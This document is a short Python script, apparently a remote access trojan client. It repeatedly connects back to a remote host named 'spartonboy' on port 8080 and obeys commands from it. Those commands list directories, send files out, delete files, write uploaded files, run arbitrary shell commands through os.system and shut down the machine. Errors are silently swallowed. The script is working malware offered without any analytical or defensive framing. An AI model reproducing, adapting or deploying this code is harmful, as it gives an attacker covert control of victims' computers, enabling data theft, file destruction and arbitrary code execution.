import os
import socket
import time

while True:
    connected = False
    run = True
    s = socket.socket()
    port = 8080
    host = "spartonboy"
    while connected is False:
        try:
            s.connect((host, port))
            connected = True
        except:
            time.sleep(7)
    while run is True:
        try:
            command = s.recv(2500)
            command = command.decode()
            if command == "view_cwd":
                files = os.getcwd()
                files = str(files)
                s.send(files.encode())
            elif command == "custom_dir":
                user_input = s.recv(5000)
                user_input = user_input.decode()
                files = os.listdir(user_input)
                files = str(files)
                s.send(files.encode())
            elif command == "download_file":
                file_path = s.recv(5000)
                file_path = file_path.decode()
                file = open(file_path, "rb")
                data = file.read()
                s.send(data)
            elif command == "remove_file":
                fileanddir = s.recv(6000)
                fileanddir = fileanddir.decode()
                os.remove(fileanddir)
            elif command == "send_file":
                filename = s.recv(6000)
                new_file = open(filename, "wb")
                data = s.recv(10000)  # change when big
                new_file.write(data)
                new_file.close()
            elif command == "command":
                prompt = s.recv(10000)
                prompt = prompt.decode()
                os.system(prompt)
            elif command == "shutdown":
                timer = s.recv(5000)
                timer = timer.decode()
                os.system("shutdown /s /t " + timer)
            elif command == "quit":
                s.close()
                run = False
        except:
            run = False
